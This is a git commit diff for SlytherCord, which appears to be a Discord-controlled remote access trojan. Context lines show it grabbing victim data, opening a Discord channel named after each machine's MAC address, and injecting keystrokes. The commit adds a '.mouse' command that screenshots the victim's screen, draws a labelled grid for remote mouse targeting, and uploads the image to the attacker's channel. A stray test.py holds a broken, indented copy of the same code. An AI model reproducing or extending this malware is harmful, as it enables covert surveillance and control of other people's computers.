d91f6cf9b729b122ae6ec8af4ae694abef1eea7e
isaaclins-laptop <isaac.lins07@gmail.com>
2023-07-19 21:50:55 +0200

    revamped the whole grid system and added a tiny size till not working. added a default size if nothing is given by command

--- SlytherCord/SlytherCord.py
+++ SlytherCord/SlytherCord.py
@@ -7,6 +7,8 @@ import asyncio
 import sys
 import requests
 import subprocess
+import string
+
 from datetime import datetime
 from uuid import getnode as get_mac
 from settings import *
@@ -19,8 +21,7 @@ from json import loads
 from re import findall
 from urllib.request import Request, urlopen
 from subprocess import Popen, PIPE
-from PIL import Image, ImageDraw #mouse grid image
-
+from PIL import Image, ImageDraw, ImageFont #mouse grid image
 
 
 file_api = "https://api.letsupload.cc/upload"
@@ -232,6 +233,7 @@ async def on_ready():
     if channel:
         await channel.send(embed=grabembed)
     else:
+        
         channel = await guild.create_text_channel(mac_address)
         e = await channel.send(embed=grabembed)
         await e.pin()
@@ -417,35 +419,70 @@ async def on_message(message):
                 except Exception as e:
                     await channel.send("Failed to send keystroke: " + hotkey + "\nError: " + str(e))
                     await message.delete()
+
             elif message.content.lower().startswith(".mouse"):
                 command = message.content[7:]
-                if command.lower() == "large" or command.lower() == "l":
+                if command.lower() == "":
                     grid_size = 100
+                    size = "large"
+                elif command.lower() == "large" or command.lower() == "l":
+                    grid_size = 100
+                    size = "large"
                 elif command.lower() == "medium" or command.lower() == "m":
                     grid_size = 75
+                    size = "medium"
                 elif command.lower() == "small" or command.lower() == "s":
                     grid_size = 50
-                else: 
-                    message.channel.send("Invalid grid size.\n Valid values are: large, medium,  small")
+                    size = "small"
+                elif command.lower() == "tiny" or command.lower() == "t":
+                    await message.reply("This is a WIP. Please refrain from using this size.")
+                    grid_size = 25
+                    size = "tiny"
+                else:
+                    await message.channel.send("Invalid grid size.\nValid values are: large, medium, small, tiny")
+                    return
+
                 screenshot = pyautogui.screenshot()
                 overlay = Image.new('RGBA', screenshot.size, (0, 0, 0, 0))
-                grid_color = (255, 0, 0, 128)  # Grid color and transparency
+                grid_color = (255, 0, 0, 255)  # Grid color and transparency
+                
+                # Determine the smaller dimension of the grid
+                grid_dimension = min(screenshot.width // grid_size, screenshot.height // grid_size)
+                labels = string.ascii_uppercase[:grid_dimension] if grid_dimension <= 26 else string.ascii_uppercase * (grid_dimension // 26) + string.ascii_uppercase[:grid_dimension % 26]
+                for x in range(0, screenshot.width, grid_size):
+                    for y in range(0, screenshot.height, grid_size):
+                        overlay.putpixel((x, y), grid_color)
+                        label_x = labels[x // grid_size % grid_dimension]  # Use modulo operator to wrap around labels
+                        label_y = y // grid_size + 1
+                        label = f"{label_x}{label_y}"
+                        draw = ImageDraw.Draw(overlay)
+                        
+                        # Centering the text
+                        label_width, label_height = draw.textsize(label)
+                        label_position = ((x + grid_size // 2) - label_width // 2, (y + grid_size // 2) - label_height // 2)
+                        
+                        # Drawing the text with white fill and black outline
+                        font = ImageFont.truetype("arial.ttf", 20)
+                        draw.text(label_position, label, fill=(255, 255, 255), font=font, outline=(0, 0, 0))
+                
                 for x in range(0, screenshot.width, grid_size):
                     for y in range(screenshot.height):
                         overlay.putpixel((x, y), grid_color)
+                
                 for y in range(0, screenshot.height, grid_size):
                     for x in range(screenshot.width):
                         overlay.putpixel((x, y), grid_color)
+                
                 global gridresult
                 gridresult = Image.alpha_composite(screenshot.convert('RGBA'), overlay)
                 path = os.path.join(os.getenv("TEMP"), "finishedscreenshot.png")
                 gridresult.save(path)
                 file = discord.File(path)
-                embed = discord.Embed(title="Screenshot", color=0xfafafa)
+                embed = discord.Embed(title=f"Screenshot with {size} size", color=0xfafafa)
                 embed.set_image(url="attachment://finishedscreenshot.png")
                 await channel.send(embed=embed, file=file) 
-                await message.delete()
-                
+                await message.delete() 
+
     else:
         print("MESSAGE SENT WAS:", message.content, "BY :" , message.author,"IN :" , message.channel,)
 
--- test.py
+++ test.py
@@ -1,16 +1,64 @@
-import pyautogui
-from PIL import Image, ImageDraw
+            elif message.content.lower().startswith(".mouse"):
+                command = message.content[7:]
+                if command.lower() == "":
+                    grid_size = 100
+                    size = "large"
+                elif command.lower() == "large" or command.lower() == "l":
+                    grid_size = 100
+                    size = "large"
+                elif command.lower() == "medium" or command.lower() == "m":
+                    grid_size = 75
+                    size = "medium"
+                elif command.lower() == "small" or command.lower() == "s":
+                    grid_size = 50
+                    size = "small"
+                elif command.lower() == "tiny" or command.lower() == "t":
+                    await message.reply("this is a WIP. Please refrain from using this size.")
+                    grid_size = 25
+                    size = "tiny"
+                else:
+                    await message.channel.send("Invalid grid size.\nValid values are: large, medium, small, tiny")
+                    return
 
-
-screenshot = pyautogui.screenshot()
-overlay = Image.new('RGBA', screenshot.size, (0, 0, 0, 0))
-grid_size = 100  # Size of each grid cell
-grid_color = (255, 0, 0, 128)  # Grid color and transparency
-for x in range(0, screenshot.width, grid_size):
-    for y in range(screenshot.height):
-        overlay.putpixel((x, y), grid_color)
-for y in range(0, screenshot.height, grid_size):
-    for x in range(screenshot.width):
-        overlay.putpixel((x, y), grid_color)
-result = Image.alpha_composite(screenshot.convert('RGBA'), overlay)
-result.show()
+                screenshot = pyautogui.screenshot()
+                overlay = Image.new('RGBA', screenshot.size, (0, 0, 0, 0))
+                grid_color = (255, 0, 0, 255)  # Grid color and transparency
+                
+                # Determine the smaller dimension of the grid
+                grid_dimension = min(screenshot.width // grid_size, screenshot.height // grid_size)
+                labels = string.ascii_uppercase[:grid_dimension]
+                
+                for x in range(0, screenshot.width, grid_size):
+                    for y in range(0, screenshot.height, grid_size):
+                        overlay.putpixel((x, y), grid_color)
+                        label_x = labels[x // grid_size % grid_dimension]  # Use modulo operator to wrap around labels
+                        label_y = y // grid_size + 1
+                        label = f"{label_x}{label_y}"
+                        draw = ImageDraw.Draw(overlay)
+                        
+                        # Centering the text
+                        label_width, label_height = draw.textsize(label)
+                        label_position = ((x + grid_size // 2) - label_width // 2, (y + grid_size // 2) - label_height // 2)
+                        
+                        # Drawing the text with white fill and black outline
+                        font = ImageFont.truetype("arial.ttf", 20)
+                        draw.text(label_position, label, fill=(255, 255, 255), font=font, outline=(0, 0, 0))
+                
+                for x in range(0, screenshot.width, grid_size):
+                    for y in range(screenshot.height):
+                        overlay.putpixel((x, y), grid_color)
+                
+                for y in range(0, screenshot.height, grid_size):
+                    for x in range(screenshot.width):
+                        overlay.putpixel((x, y), grid_color)
+                
+                global gridresult
+                gridresult = Image.alpha_composite(screenshot.convert('RGBA'), overlay)
+                path = os.path.join(os.getenv("TEMP"), "finishedscreenshot.png")
+                gridresult.save(path)
+                file = discord.File(path)
+                embed = discord.Embed(title=f"Screenshot with {size} size", color=0xfafafa)
+                embed.set_image(url="attachment://finishedscreenshot.png")
+                await channel.send(embed=embed, file=file) 
+                await message.delete() 
+  
